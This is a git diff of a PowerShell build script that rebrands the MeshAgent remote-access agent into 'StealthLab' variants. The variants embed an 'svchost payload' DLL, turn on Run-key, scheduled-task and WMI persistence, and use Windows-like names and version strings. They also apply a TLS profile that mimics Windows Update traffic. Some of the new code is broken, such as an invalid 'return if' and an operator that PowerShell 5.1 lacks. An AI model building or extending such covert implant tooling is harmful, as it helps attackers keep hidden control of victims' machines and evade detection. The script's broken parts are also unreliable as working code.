@@ -1,32 +1,27 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Build custom-branded MeshAgent binaries locally
+    Build custom MeshAgent binaries with branding and svchost payload support.
 
 .DESCRIPTION
-    This script builds MeshService64.exe and MeshService.exe with custom Acme branding.
-    Requires Visual Studio 2022 with C++ build tools installed.
+    This script drives the Windows build for MeshAgent. It generates the branding
+    header/.msh provisioning data, stages the svchost payload, compiles the requested
+    configuration, and performs a few post-build sanity checks.
 
 .PARAMETER Configuration
-    Build configuration (Release or Debug). Default: Release
+    Build configuration (Release, Debug, StealthLab, StealthLab_DLL). Default: Release.
 
 .PARAMETER SkipClean
-    Skip cleaning before build
+    Skip removal of previous build artefacts.
 
 .PARAMETER SkipTests
-    Skip running tests after build
+    Skip the lightweight verification checks at the end of the build.
 
-.EXAMPLE
-    .\build.ps1
-    Build both x64 and x86 Release binaries
+.PARAMETER StealthLab
+    Convenience switch that maps Release -> StealthLab and sets STEALTH_LAB=1.
 
-.EXAMPLE
-    .\build.ps1 -Configuration Debug
-    Build Debug binaries
-
-.NOTES
-    Author: Generated with Claude Code
-    Requires: Visual Studio 2022, Python 3.x
+.PARAMETER BuildSvchostDll
+    After the main build completes, rebuild the StealthLab_DLL configuration as well.
 #>
 
 [CmdletBinding()]
@@ -44,16 +39,32 @@ param(
     [Parameter()]
     [switch]$StealthLab,
 
-[Parameter()]
-[switch]$BuildSvchostDll
+    [Parameter()]
+    [switch]$BuildSvchostDll
 )
 
+Set-StrictMode -Version Latest
 $ErrorActionPreference = 'Stop'
+
+function Write-Section {
+    param([string]$Title)
+    Write-Host ""
+    Write-Host "==================================================" -ForegroundColor Cyan
+    Write-Host ("{0}" -f $Title) -ForegroundColor Cyan
+    Write-Host "==================================================" -ForegroundColor Cyan
+}
+
+function Write-Info { param([string]$Message) Write-Host ("[INFO] {0}" -f $Message) -ForegroundColor Gray }
+function Write-Warn { param([string]$Message) Write-Host ("[WARN] {0}" -f $Message) -ForegroundColor Yellow }
+function Write-Ok   { param([string]$Message) Write-Host ("[ OK ] {0}" -f $Message) -ForegroundColor Green }
+function Write-Err  { param([string]$Message) Write-Host ("[ERR ] {0}" -f $Message) -ForegroundColor Red }
 
 function Stage-SvchostPayload {
     param(
         [Parameter(Mandatory = $true)]
-        [string]$RepoRoot
+        [string]$RepoRoot,
+
+        [switch]$Quiet
     )
 
     $payloadDir = Join-Path $RepoRoot "meshservice\embedded"
@@ -61,391 +72,186 @@ function Stage-SvchostPayload {
         New-Item -Path $payloadDir -ItemType Directory -Force | Out-Null
     }
 
-    $preferredDll = Join-Path $RepoRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
-    $candidateList = @()
-
-    if (Test-Path $preferredDll) {
-        $candidateList += Get-Item -Path $preferredDll
-    }
-
     $candidateDirs = @(
+        (Join-Path $RepoRoot "meshservice\x64\StealthLab_DLL"),
         (Join-Path $RepoRoot "meshservice\StealthLab_DLL")
-        (Join-Path $RepoRoot "meshservice\x64\StealthLab_DLL")
     )
 
-    foreach ($candidateDir in $candidateDirs) {
-        if (Test-Path $candidateDir) {
-            $candidateList += Get-ChildItem -Path $candidateDir -Filter *.dll -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending
+    $candidates = @()
+    foreach ($dir in $candidateDirs) {
+        if (Test-Path $dir) {
+            $candidates += Get-ChildItem -Path $dir -Filter *.dll -ErrorAction SilentlyContinue
         }
     }
 
-    $candidateList = $candidateList | Where-Object { $_ }
-    $dllCandidate = $candidateList | Select-Object -First 1
-
-    if (-not $dllCandidate) {
-        Write-Host "[Pre] ⚠️ No svchost DLL found to embed" -ForegroundColor Yellow
+    if (-not $candidates) {
+        if (-not $Quiet) { Write-Warn "No svchost DLL found to stage (build StealthLab_DLL first)" }
         return $false
     }
 
+    $latest = $candidates | Sort-Object LastWriteTime -Descending | Select-Object -First 1
     $payloadPath = Join-Path $payloadDir "svchost_payload.dll"
-    Copy-Item -Path $dllCandidate.FullName -Destination $payloadPath -Force
+    Copy-Item -Path $latest.FullName -Destination $payloadPath -Force
 
-    $hashDisplay = "n/a"
+    $hashSummary = "n/a"
     try {
         $hash = (Get-FileHash -Path $payloadPath -Algorithm SHA256).Hash
-        if ($hash.Length -ge 8) {
-            $hashDisplay = $hash.Substring(0, 8)
-        } else {
-            $hashDisplay = $hash
-        }
-    } catch {
-        # ignore hash failures; optional diagnostics only
-    }
+        if ($hash) { $hashSummary = $hash.Substring(0, [Math]::Min(8, $hash.Length)) }
+    } catch { }
 
-    Write-Host ("[Pre] Staged payload: {0} -> embedded\svchost_payload.dll (SHA256 {1}...)" -f $dllCandidate.Name, $hashDisplay) -ForegroundColor Gray
+    if (-not $Quiet) {
+        Write-Info ("Staged svchost payload: {0} -> embedded\svchost_payload.dll (SHA256 {1}...)" -f $latest.Name, $hashSummary)
+    }
     return $true
 }
 
 function Get-OutputPath {
     param(
-        [Parameter(Mandatory = $true)]
-        [string]$RepoRoot,
-
-        [Parameter(Mandatory = $true)]
-        [string]$Configuration,
-
-        [Parameter(Mandatory = $true)]
-        [ValidateSet('x64', 'Win32')]
-        [string]$Platform
+        [Parameter(Mandatory = $true)] [string]$RepoRoot,
+        [Parameter(Mandatory = $true)] [string]$Configuration,
+        [Parameter(Mandatory = $true)] [ValidateSet('x64','Win32')] [string]$Platform
     )
 
-    $configMap = @{
-        'Release' = @{
-            'x64'  = 'meshservice\Release\MeshService64.exe'
-            'Win32'= 'meshservice\Release\MeshService.exe'
-        }
-        'Release_NoOpenSSL' = @{
-            'x64'  = 'meshservice\Release_NoOpenSSL\MeshService64.exe'
-            'Win32'= 'meshservice\Release_NoOpenSSL\MeshService.exe'
-        }
-        'Debug' = @{
-            'x64'  = 'meshservice\Debug\MeshService64.exe'
-            'Win32'= 'meshservice\Debug\MeshService.exe'
-        }
-        'Debug_NoOpenSSL' = @{
-            'x64'  = 'meshservice\Debug_NoOpenSSL\MeshService64.exe'
-            'Win32'= 'meshservice\Debug_NoOpenSSL\MeshService.exe'
-        }
-        'StealthLab' = @{
-            'x64'  = 'meshservice\x64\StealthLab\MeshService-2022.exe'
-            'Win32'= 'meshservice\StealthLab\MeshService-2022.exe'
-        }
-        'StealthLab_DLL' = @{
-            'x64'  = 'meshservice\x64\StealthLab_DLL\MeshService-2022.dll'
-        }
-        'Release_DLL' = @{
-            'x64'  = 'meshservice\x64\Release_DLL\MeshService-2022.dll'
-        }
-        'Debug_DLL' = @{
-            'x64'  = 'meshservice\x64\Debug_DLL\MeshService-2022.dll'
-        }
+    $map = @{
+        'Release'        = @{ 'x64' = 'meshservice\Release\MeshService64.exe'; 'Win32' = 'meshservice\Release\MeshService.exe' }
+        'Release_NoOpenSSL' = @{ 'x64' = 'meshservice\Release_NoOpenSSL\MeshService64.exe'; 'Win32' = 'meshservice\Release_NoOpenSSL\MeshService.exe' }
+        'Debug'          = @{ 'x64' = 'meshservice\Debug\MeshService64.exe'; 'Win32' = 'meshservice\Debug\MeshService.exe' }
+        'Debug_NoOpenSSL'= @{ 'x64' = 'meshservice\Debug_NoOpenSSL\MeshService64.exe'; 'Win32' = 'meshservice\Debug_NoOpenSSL\MeshService.exe' }
+        'StealthLab'     = @{ 'x64' = 'meshservice\x64\StealthLab\MeshService-2022.exe'; 'Win32' = 'meshservice\StealthLab\MeshService-2022.exe' }
+        'StealthLab_DLL' = @{ 'x64' = 'meshservice\x64\StealthLab_DLL\MeshService-2022.dll' }
+        'Release_DLL'    = @{ 'x64' = 'meshservice\x64\Release_DLL\MeshService-2022.dll' }
+        'Debug_DLL'      = @{ 'x64' = 'meshservice\x64\Debug_DLL\MeshService-2022.dll' }
     }
 
-    if ($configMap.ContainsKey($Configuration)) {
-        $platformMap = $configMap[$Configuration]
-        if ($platformMap.ContainsKey($Platform) -and $platformMap[$Platform]) {
-            return Join-Path $RepoRoot $platformMap[$Platform]
-        }
+    if ($map.ContainsKey($Configuration) -and $map[$Configuration].ContainsKey($Platform)) {
+        $relative = $map[$Configuration][$Platform]
+        if ($relative) { return Join-Path $RepoRoot $relative }
     }
 
-    if ($Platform -eq 'x64') {
-        return Join-Path $RepoRoot 'meshservice\Release\MeshService64.exe'
+    return if ($Platform -eq 'x64') {
+        Join-Path $RepoRoot 'meshservice\Release\MeshService64.exe'
     } else {
-        return Join-Path $RepoRoot 'meshservice\Release\MeshService.exe'
+        Join-Path $RepoRoot 'meshservice\Release\MeshService.exe'
     }
 }
 
-# Configuration
-$RepoRoot = $PSScriptRoot
-$BrandingConfig = Join-Path $RepoRoot "branding_config.json"
-$BrandingHeader = Join-Path $RepoRoot "meshcore\generated\meshagent_branding.h"
-$MSBuildPath = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
-$SolutionFile = Join-Path $RepoRoot "MeshAgent-2022.sln"
-$ProjectFile = Join-Path $RepoRoot "meshservice\MeshService-2022.vcxproj"
+$RepoRoot        = $PSScriptRoot
+$BrandingConfig  = Join-Path $RepoRoot "branding_config.json"
+$BrandingHeader  = Join-Path $RepoRoot "meshcore\generated\meshagent_branding.h"
+$ProvisioningMsh = Join-Path $RepoRoot "WinDiagnosticHost.msh"
+$MSBuildPath     = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"
+$SolutionFile    = Join-Path $RepoRoot "MeshAgent-2022.sln"
+$ProjectFile     = Join-Path $RepoRoot "meshservice\MeshService-2022.vcxproj"
+$NetworkProfileScript = Join-Path $RepoRoot "tools\generate_network_profile.py"
+$EmbedProvisioningScript = Join-Path $RepoRoot "tools\embed_provisioning_simple.ps1"
 
-# If StealthLab is requested, set environment for branding generator and default config
 if ($StealthLab) {
     $env:STEALTH_LAB = '1'
-    if ($Configuration -eq 'Release') {
-        $Configuration = 'StealthLab'
-    }
-    Write-Host "[StealthLab] Lab stealth features enabled (env: STEALTH_LAB=1)" -ForegroundColor Yellow
+    if ($Configuration -eq 'Release') { $Configuration = 'StealthLab' }
 }
 
-Write-Host "" 
-Write-Host "================================================================" -ForegroundColor Cyan
-Write-Host "  MeshAgent Custom Build Script" -ForegroundColor Cyan
-Write-Host "  Configuration: $Configuration" -ForegroundColor Cyan
-Write-Host "================================================================" -ForegroundColor Cyan
-Write-Host ""
+Write-Section ("MeshAgent Build - {0}" -f $Configuration)
 
-# Output destinations depend on final configuration selection
 $OutputX64 = Get-OutputPath -RepoRoot $RepoRoot -Configuration $Configuration -Platform 'x64'
 $OutputX86 = Get-OutputPath -RepoRoot $RepoRoot -Configuration $Configuration -Platform 'Win32'
 
-#region Step 1: Validate Environment
-Write-Host "[1/7] Validating build environment..." -ForegroundColor Green
+# Step 1: Validate environment
+Write-Section "[1/7] Environment validation"
 
-if (-not (Test-Path $MSBuildPath)) {
-    Write-Host "❌ MSBuild not found at: $MSBuildPath" -ForegroundColor Red
-    Write-Host "Please install Visual Studio 2022 with C++ build tools" -ForegroundColor Yellow
-    exit 1
-}
+if (-not (Test-Path $MSBuildPath)) { throw "MSBuild not found at '$MSBuildPath'. Install Visual Studio 2022 build tools or update the path." }
+if (-not (Test-Path $BrandingConfig)) { throw "Branding config not found: $BrandingConfig" }
+if (-not (Test-Path $ProjectFile)) { throw "Project file not found: $ProjectFile" }
+if (-not (Test-Path $SolutionFile)) { throw "Solution file not found: $SolutionFile" }
 
-if (-not (Test-Path $BrandingConfig)) {
-    Write-Host "❌ Branding config not found: $BrandingConfig" -ForegroundColor Red
-    exit 1
-}
-
-# Check Python
 try {
     $pythonVersion = python --version 2>&1
-    Write-Host "✅ Python found: $pythonVersion" -ForegroundColor Gray
+    Write-Info ("Python detected: {0}" -f $pythonVersion.Trim())
 } catch {
-    Write-Host "❌ Python not found. Please install Python 3.x" -ForegroundColor Red
-    exit 1
+    Write-Warn "Python not found. Network profile generation will be skipped."
+    $NetworkProfileScript = $null
 }
 
-Write-Host "✅ Build environment validated" -ForegroundColor Gray
-#endregion
+Write-Ok "Environment looks good"
 
-#region Step 2: Generate Branding Headers
-Write-Host "[2/7] Generating branding headers..." -ForegroundColor Green
+# Step 2: Generate branding header and provisioning .msh
+Write-Section "[2/7] Generating branding artifacts"
 
-$brandingScript = @'
-import json
-import os
-
-# Load branding config
-with open('branding_config.json', 'r') as f:
-    config = json.load(f)
-
-branding = config.get('branding', {})
-network = config.get('network', {})
-
-service_name = branding.get('serviceName', 'MeshAgent')
-display_name = branding.get('displayName', 'Mesh Agent Background Service')
-company_name = branding.get('companyName', '')
-product_name = branding.get('productName', service_name)
-description = branding.get('description', display_name)
-binary_name = branding.get('binaryName', f'{service_name}.exe')
-log_path = branding.get('logPath', 'C:/ProgramData/MeshAgent/logs')
-
-# Version info
-version_info = branding.get('versionInfo', {})
-file_version = version_info.get('fileVersion', '10.0.19041.0')
-product_version = version_info.get('productVersion', '10.0.19041.0')
-
-# Parse version strings
-file_parts = file_version.split('.')
-file_major = file_parts[0] if len(file_parts) > 0 else '10'
-file_minor = file_parts[1] if len(file_parts) > 1 else '0'
-file_build = file_parts[2] if len(file_parts) > 2 else '19041'
-file_revision = file_parts[3] if len(file_parts) > 3 else '0'
-
-prod_parts = product_version.split('.')
-prod_major = prod_parts[0] if len(prod_parts) > 0 else '10'
-prod_minor = prod_parts[1] if len(prod_parts) > 1 else '0'
-prod_build = prod_parts[2] if len(prod_parts) > 2 else '19041'
-prod_revision = prod_parts[3] if len(prod_parts) > 3 else '0'
-
-endpoint = network.get('primaryEndpoint', '')
-user_agent = network.get('userAgent', 'MeshAgent/1.0')
-
-header = f'''/* Generated file - do not edit. */
-#ifndef GENERATED_MESHAGENT_BRANDING_H
-#define GENERATED_MESHAGENT_BRANDING_H
-
-#undef MESH_AGENT_SERVICE_FILE
-#define MESH_AGENT_SERVICE_FILE TEXT("{service_name}")
-#undef MESH_AGENT_SERVICE_NAME
-#define MESH_AGENT_SERVICE_NAME TEXT("{display_name}")
-#undef MESH_AGENT_COMPANY_NAME
-#define MESH_AGENT_COMPANY_NAME "{company_name}"
-#undef MESH_AGENT_PRODUCT_NAME
-#define MESH_AGENT_PRODUCT_NAME "{product_name}"
-#undef MESH_AGENT_FILE_DESCRIPTION
-#define MESH_AGENT_FILE_DESCRIPTION "{description}"
-#undef MESH_AGENT_INTERNAL_NAME
-#define MESH_AGENT_INTERNAL_NAME "{binary_name}"
-#undef MESH_AGENT_ORIGINAL_FILENAME
-#define MESH_AGENT_ORIGINAL_FILENAME "{binary_name}"
-#undef MESH_AGENT_COPYRIGHT
-#define MESH_AGENT_COPYRIGHT "Apache 2.0 License"
-#undef MESH_AGENT_LOG_DIRECTORY
-#define MESH_AGENT_LOG_DIRECTORY TEXT("{log_path}")
-
-/* Version Information */
-#define MESH_AGENT_FILE_VERSION_MAJOR {file_major}
-#define MESH_AGENT_FILE_VERSION_MINOR {file_minor}
-#define MESH_AGENT_FILE_VERSION_BUILD {file_build}
-#define MESH_AGENT_FILE_VERSION_REVISION {file_revision}
-#define MESH_AGENT_FILE_VERSION_STR "{file_version}"
-
-#define MESH_AGENT_PRODUCT_VERSION_MAJOR {prod_major}
-#define MESH_AGENT_PRODUCT_VERSION_MINOR {prod_minor}
-#define MESH_AGENT_PRODUCT_VERSION_BUILD {prod_build}
-#define MESH_AGENT_PRODUCT_VERSION_REVISION {prod_revision}
-#define MESH_AGENT_PRODUCT_VERSION_STR "{product_version}"
-
-/* Optional network hints for future use */
-#define MESH_AGENT_NETWORK_ENDPOINT "{endpoint}"
-#define MESH_AGENT_NETWORK_SNI NULL
-#define MESH_AGENT_NETWORK_USER_AGENT "{user_agent}"
-#define MESH_AGENT_NETWORK_JA3 NULL
-
-/* Persistence flags */
-/* In lab builds (STEALTH_LAB=1), default to enabling all persistence knobs */
-{'' if not os.getenv('STEALTH_LAB') else ''}
-#define MESH_AGENT_PERSIST_RUNKEY {1 if os.getenv('STEALTH_LAB') else 0}
-#define MESH_AGENT_PERSIST_TASK {1 if os.getenv('STEALTH_LAB') else 0}
-#define MESH_AGENT_PERSIST_WMI {1 if os.getenv('STEALTH_LAB') else 0}
-#define MESH_AGENT_PERSIST_WATCHDOG 1
-
-#endif /* GENERATED_MESHAGENT_BRANDING_H */
-'''
-
-# Write to meshcore/generated/
-os.makedirs('meshcore/generated', exist_ok=True)
-with open('meshcore/generated/meshagent_branding.h', 'w') as f:
-    f.write(header)
-
-print('Generated branding header successfully')
-print(f'Service: {service_name}')
-print(f'Display: {display_name}')
-print(f'Endpoint: {endpoint}')
-'@
-
-Set-Content -Path "$env:TEMP\generate_branding.py" -Value $brandingScript
-Push-Location $RepoRoot
-try {
-    python "$env:TEMP\generate_branding.py"
-    if ($LASTEXITCODE -ne 0) {
-        throw "Branding header generation failed"
-    }
-} finally {
-    Pop-Location
+if (-not (Test-Path $EmbedProvisioningScript)) {
+    throw "Provisioning embed script missing: $EmbedProvisioningScript"
 }
 
-Write-Host "✅ Branding headers generated" -ForegroundColor Gray
-#endregion
+$embedArgs = @(
+    '-NoProfile',
+    '-ExecutionPolicy','Bypass',
+    '-File', $EmbedProvisioningScript,
+    '-ConfigPath', $BrandingConfig,
+    '-OutputHeader', $BrandingHeader,
+    '-OutputMsh', $ProvisioningMsh
+)
+& powershell.exe $embedArgs
+if ($LASTEXITCODE -ne 0) { throw "embed_provisioning_simple.ps1 failed with exit code $LASTEXITCODE" }
 
-#region Step 2.5: Generate Network Obfuscation Profile
-Write-Host "[2.5/7] Generating network obfuscation profile..." -ForegroundColor Green
+Write-Ok "Branding header and provisioning data refreshed"
 
-# Check if TLS profile is specified in environment or config
-$tlsProfile = $env:TLS_PROFILE
-if (-not $tlsProfile) {
-    $tlsProfile = "windows_update"  # Default to Windows Update profile
-}
+# Step 3: Generate network profile (optional)
+Write-Section "[3/7] Generating network profile"
 
-$networkProfileScript = Join-Path $RepoRoot "tools\generate_network_profile.py"
-if (Test-Path $networkProfileScript) {
+if ($NetworkProfileScript -and (Test-Path $NetworkProfileScript)) {
     try {
-        $networkArgs = @(
-            $networkProfileScript,
+        $profileArgs = @(
+            $NetworkProfileScript,
             "--config", $BrandingConfig,
-            "--tls-profile", $tlsProfile,
+            "--tls-profile", ($env:TLS_PROFILE ?? "windows_update"),
             "--output-header", (Join-Path $RepoRoot "meshcore\generated\network_profile.h"),
             "--output-json", (Join-Path $RepoRoot "build\meshagent\generated\network_profile.json")
         )
-
-        & python $networkArgs | Out-String | Write-Host
-
+        & python $profileArgs
         if ($LASTEXITCODE -eq 0) {
-            Write-Host "✅ Network profile generated (TLS: $tlsProfile)" -ForegroundColor Gray
+            Write-Ok "Network profile generated"
         } else {
-            Write-Host "⚠️  Network profile generation failed (continuing without)" -ForegroundColor Yellow
+            Write-Warn ("Network profile generator exited with {0}" -f $LASTEXITCODE)
         }
     } catch {
-        Write-Host "⚠️  Network profile generation error: $_" -ForegroundColor Yellow
+        Write-Warn ("Network profile generation failed: {0}" -f $_)
     }
 } else {
-    Write-Host "⚠️  Network profile generator not found (skipping)" -ForegroundColor Yellow
+    Write-Info "No network profile script detected; skipping"
 }
-#endregion
 
-#region Step 3: Fix Resource File
-Write-Host "[3/7] Fixing resource file..." -ForegroundColor Green
+# Step 4: Clean (optional)
+Write-Section "[4/7] Cleaning"
 
-$rcFile = Join-Path $RepoRoot "meshservice\MeshService.rc"
-if (Test-Path $rcFile) {
-    $rcContent = Get-Content -Path $rcFile -Raw
-    if ($rcContent -match '#include\s+"afxres\.h"') {
-        $rcContent = $rcContent -replace '#include\s+"afxres\.h"', '#include <windows.h>'
-        Set-Content -Path $rcFile -Value $rcContent -NoNewline
-        Write-Host "✅ Fixed afxres.h → windows.h" -ForegroundColor Gray
-    } else {
-        Write-Host "✅ Resource file already fixed" -ForegroundColor Gray
-    }
-}
-#endregion
-
-#region Step 4: Clean (Optional)
-if (-not $SkipClean) {
-    Write-Host "[4/7] Cleaning previous build..." -ForegroundColor Green
-
-    $cleanDirs = @(
+if ($SkipClean) {
+    Write-Info "Clean skipped by request"
+} else {
+    $cleanTargets = @(
         "meshservice\Release",
-        "meshservice\$Configuration",
+        "meshservice\Debug",
+        "meshservice\StealthLab",
         "meshservice\x64\$Configuration",
-        "meshservice\x64\OBJ",
-        "Release"
-    ) | Where-Object { $_ } | Select-Object -Unique
+        "meshservice\x64\OBJ"
+    ) | Where-Object { $_ }
 
-    foreach ($dir in $cleanDirs) {
-        $fullPath = Join-Path $RepoRoot $dir
+    foreach ($target in $cleanTargets) {
+        $fullPath = Join-Path $RepoRoot $target
         if (Test-Path $fullPath) {
             Remove-Item -Path $fullPath -Recurse -Force -ErrorAction SilentlyContinue
         }
     }
-
-    Write-Host "✅ Clean completed" -ForegroundColor Gray
-} else {
-    Write-Host "[4/7] Skipping clean (as requested)" -ForegroundColor Yellow
-}
-#endregion
-
-# Optional pre-step: build StealthLab_DLL and stage payload for resource bundling
-$payloadStaged = $false
-if ($BuildSvchostDll -or $StealthLab) {
-    Write-Host "[Pre] Building svchost DLL (StealthLab_DLL|x64) for bundling..." -ForegroundColor Green
-    $dllArgsPre = @(
-        $ProjectFile,
-        "/p:Configuration=StealthLab_DLL",
-        "/p:Platform=x64",
-        "/p:WindowsTargetPlatformVersion=10.0",
-        "/p:PlatformToolset=v143",
-        "/m",
-        "/v:minimal",
-        "/t:Rebuild"
-    )
-    & $MSBuildPath $dllArgsPre
-    if ($LASTEXITCODE -ne 0) {
-        Write-Host "? Pre DLL build failed with exit code $LASTEXITCODE" -ForegroundColor Red
-        exit $LASTEXITCODE
-    }
-    $payloadStaged = Stage-SvchostPayload -RepoRoot $RepoRoot
+    Write-Ok "Previous artefacts removed"
 }
 
-if (-not $payloadStaged) {
-    $payloadStaged = Stage-SvchostPayload -RepoRoot $RepoRoot
+# Step 5: Stage svchost payload before build so resources embed correctly
+Write-Section "[5/7] Staging svchost payload"
+$preStage = Stage-SvchostPayload -RepoRoot $RepoRoot
+if (-not $preStage) {
+    Write-Warn "Continuing without staged payload; StealthLab builds may miss SVCHOSTDLL resource"
 }
 
-#region Step 5: Build x64
-Write-Host "[5/7] Building MeshService x64..." -ForegroundColor Green
+# Step 6: Build x64
+Write-Section "[6/7] Building x64"
 
-$buildArgs = @(
+$msbuildArgsX64 = @(
     $ProjectFile,
     "/p:Configuration=$Configuration",
     "/p:Platform=x64",
@@ -455,29 +261,21 @@ $buildArgs = @(
     "/v:minimal",
     "/t:Rebuild"
 )
+& "$MSBuildPath" $msbuildArgsX64
+if ($LASTEXITCODE -ne 0) { throw "MSBuild (x64) failed with exit code $LASTEXITCODE" }
 
-& $MSBuildPath $buildArgs
+if (-not (Test-Path $OutputX64)) { throw "Expected x64 output not found at $OutputX64" }
+$x64Item = Get-Item $OutputX64
+Write-Ok ("x64 build complete: {0} ({1:N2} MB)" -f $x64Item.Name, ($x64Item.Length / 1MB))
 
-if ($LASTEXITCODE -ne 0) {
-    Write-Host "❌ x64 build failed with exit code $LASTEXITCODE" -ForegroundColor Red
-    exit $LASTEXITCODE
-}
+# Refresh staged payload with newly built DLLs (if any)
+Stage-SvchostPayload -RepoRoot $RepoRoot -Quiet | Out-Null
 
-if (-not $OutputX64 -or -not (Test-Path $OutputX64)) {
-    Write-Host "❌ x64 binary not found at: $OutputX64" -ForegroundColor Red
-    exit 1
-}
+# Step 7: Build x86 if configuration produces a Win32 artefact
+if ($OutputX86 -and ($Configuration -notmatch '_DLL$')) {
+    Write-Section "[7/7] Building Win32"
 
-$x64Size = (Get-Item $OutputX64).Length
-$x64SizeMB = [math]::Round($x64Size / 1MB, 2)
-Write-Host "✅ x64 build completed: ${x64SizeMB} MB" -ForegroundColor Gray
-#endregion
-
-#region Step 6: Build x86
-if ($OutputX86) {
-    Write-Host "[6/7] Building MeshService x86..." -ForegroundColor Green
-
-    $buildArgs = @(
+    $msbuildArgsWin32 = @(
         $ProjectFile,
         "/p:Configuration=$Configuration",
         "/p:Platform=Win32",
@@ -487,96 +285,53 @@ if ($OutputX86) {
         "/v:minimal",
         "/t:Rebuild"
     )
+    & "$MSBuildPath" $msbuildArgsWin32
+    if ($LASTEXITCODE -ne 0) { throw "MSBuild (Win32) failed with exit code $LASTEXITCODE" }
 
-    & $MSBuildPath $buildArgs
-
-    if ($LASTEXITCODE -ne 0) {
-        Write-Host "❌ x86 build failed with exit code $LASTEXITCODE" -ForegroundColor Red
-        exit $LASTEXITCODE
-    }
-
-    if (-not (Test-Path $OutputX86)) {
-        Write-Host "❌ x86 binary not found at: $OutputX86" -ForegroundColor Red
-        exit 1
-    }
-
-    $x86Size = (Get-Item $OutputX86).Length
-    $x86SizeMB = [math]::Round($x86Size / 1MB, 2)
-    Write-Host "✅ x86 build completed: ${x86SizeMB} MB" -ForegroundColor Gray
+    if (-not (Test-Path $OutputX86)) { throw "Expected Win32 output not found at $OutputX86" }
+    $x86Item = Get-Item $OutputX86
+    Write-Ok ("Win32 build complete: {0} ({1:N2} MB)" -f $x86Item.Name, ($x86Item.Length / 1MB))
 } else {
-    Write-Host "[6/7] Skipping MeshService Win32 build for configuration '$Configuration' (no Win32 artifact expected)" -ForegroundColor Yellow
-    $x86Size = $null
-    $x86SizeMB = $null
-}
-#endregion
-
-#region Step 7: Verify & Test
-Write-Host "[7/7] Verifying build outputs..." -ForegroundColor Green
-
-$x64Item = Get-Item -Path $OutputX64
-$x64Size = $x64Item.Length
-$x64SizeMB = [math]::Round($x64Size / 1MB, 2)
-$x64MD5 = (Get-FileHash -Path $OutputX64 -Algorithm MD5).Hash
-$x64Name = Split-Path -Path $OutputX64 -Leaf
-$x86Item = $null
-$x86MD5 = $null
-$x86Name = $null
-
-if ($OutputX86 -and (Test-Path $OutputX86)) {
-    $x86Item = Get-Item -Path $OutputX86
-    $x86Size = $x86Item.Length
-    $x86SizeMB = [math]::Round($x86Size / 1MB, 2)
-    $x86MD5 = (Get-FileHash -Path $OutputX86 -Algorithm MD5).Hash
-    $x86Name = Split-Path -Path $OutputX86 -Leaf
+    Write-Section "[7/7] Building Win32"
+    Write-Info "No Win32 artefact expected for configuration '$Configuration'; skipping"
+    $x86Item = $null
 }
 
-Write-Host ""
-Write-Host "================================================================" -ForegroundColor Green
-Write-Host "  BUILD SUCCESSFUL" -ForegroundColor Green
-Write-Host "================================================================" -ForegroundColor Green
-Write-Host ""
-Write-Host "Outputs:" -ForegroundColor Cyan
-Write-Host ("  [x64] {0}: {1} MB (MD5: {2})" -f $x64Name, $x64SizeMB, $x64MD5) -ForegroundColor White
+# Verification
+Write-Section "Verification"
+
+$hashX64 = (Get-FileHash -Path $OutputX64 -Algorithm MD5).Hash
+Write-Info ("x64 MD5 : {0}" -f $hashX64)
 if ($x86Item) {
-    Write-Host ("  [x86] {0}: {1} MB (MD5: {2})" -f $x86Name, $x86SizeMB, $x86MD5) -ForegroundColor White
-} else {
-    Write-Host "  [!] Win32 output not produced for this configuration" -ForegroundColor Yellow
+    $hashX86 = (Get-FileHash -Path $x86Item.FullName -Algorithm MD5).Hash
+    Write-Info ("x86 MD5 : {0}" -f $hashX86)
 }
-Write-Host ""
-Write-Host "Next steps:" -ForegroundColor Cyan
-Write-Host "  1. Test binaries locally" -ForegroundColor White
-Write-Host "  2. Commit binaries: git add meshservice/Release/*.exe" -ForegroundColor White
-Write-Host "  3. Create release: git tag v1.0.0 && git push origin v1.0.0" -ForegroundColor White
-Write-Host "  4. Or deploy manually: .\deploy.ps1" -ForegroundColor White
-Write-Host ""
 
 if (-not $SkipTests) {
-    Write-Host "Running basic validation tests..." -ForegroundColor Yellow
-
-    # Test 1: File size check
-    if ($x64Size -lt 3000000 -or ($x86Item -and $x86Size -lt 3000000)) {
-        Write-Host "⚠️ Warning: Binary size smaller than expected" -ForegroundColor Yellow
+    if ($x64Item.Length -lt 3MB) {
+        Write-Warn "x64 binary smaller than 3 MB; embedded resources may be missing"
     }
-
-    # Test 2: PE header check
     try {
-        $x64PE = Get-Content -Path $OutputX64 -Encoding Byte -TotalCount 2
-        if ($x64PE[0] -eq 0x4D -and $x64PE[1] -eq 0x5A) {
-            Write-Host "✅ x64 binary has valid PE header" -ForegroundColor Gray
+        $peHeader = Get-Content -Path $OutputX64 -Encoding Byte -TotalCount 2
+        if ($peHeader[0] -eq 0x4D -and $peHeader[1] -eq 0x5A) {
+            Write-Ok "x64 binary has valid PE header"
+        } else {
+            Write-Warn "x64 binary failed PE signature check"
         }
     } catch {
-        Write-Host "⚠️ Could not validate PE headers" -ForegroundColor Yellow
+        Write-Warn ("Unable to validate PE header: {0}" -f $_)
     }
-
-    Write-Host "✅ Basic validation passed" -ForegroundColor Gray
 }
 
-Write-Host "" 
-#endregion
+Write-Section "Build summary"
+Write-Host ("Configuration : {0}" -f $Configuration) -ForegroundColor Cyan
+Write-Host ("x64 Output   : {0}" -f $OutputX64) -ForegroundColor Cyan
+if ($x86Item) { Write-Host ("Win32 Output : {0}" -f $OutputX86) -ForegroundColor Cyan }
+Write-Host ("Provisioning : {0}" -f $ProvisioningMsh) -ForegroundColor Cyan
+Write-Host ""
 
-# Optionally build the svchost-hosted DLL (x64) in the same run
 if ($BuildSvchostDll) {
-    Write-Host "[Extra] Building svchost DLL (StealthLab_DLL|x64)..." -ForegroundColor Green
+    Write-Section "Extra: Building StealthLab_DLL"
     $dllArgs = @(
         $ProjectFile,
         "/p:Configuration=StealthLab_DLL",
@@ -587,17 +342,15 @@ if ($BuildSvchostDll) {
         "/v:minimal",
         "/t:Rebuild"
     )
-    & $MSBuildPath $dllArgs
-    if ($LASTEXITCODE -ne 0) {
-        Write-Host "�?O DLL build failed with exit code $LASTEXITCODE" -ForegroundColor Red
-        exit $LASTEXITCODE
-    }
-    $dllOutDir = Join-Path $RepoRoot "meshservice\StealthLab_DLL"
